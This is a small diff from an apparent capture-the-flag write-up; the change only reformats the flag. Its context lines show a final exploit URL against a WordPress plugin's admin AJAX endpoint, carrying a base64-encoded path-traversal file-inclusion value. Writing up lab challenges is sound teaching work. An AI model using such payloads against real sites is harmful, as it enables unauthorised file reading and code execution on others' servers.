@@ -70,4 +70,4 @@ Final url :
 
 [http://54.201.224.15:14099/wp-content/plugins/sam-pro-free/sam-pro-ajax-admin.php?action=NA&wap=Li4vLi4vLi4vLi4vYmxhaC5waHA=](http://54.201.224.15:14099/wp-content/plugins/sam-pro-free/sam-pro-ajax-admin.php?action=NA&wap=Li4vLi4vLi4vLi4vYmxhaC5waHA=)
 
-> The flag : flag{dont_include_files_derived_from_user_input_kthx_bai}
+> The flag : ```flag{dont_include_files_derived_from_user_input_kthx_bai}```
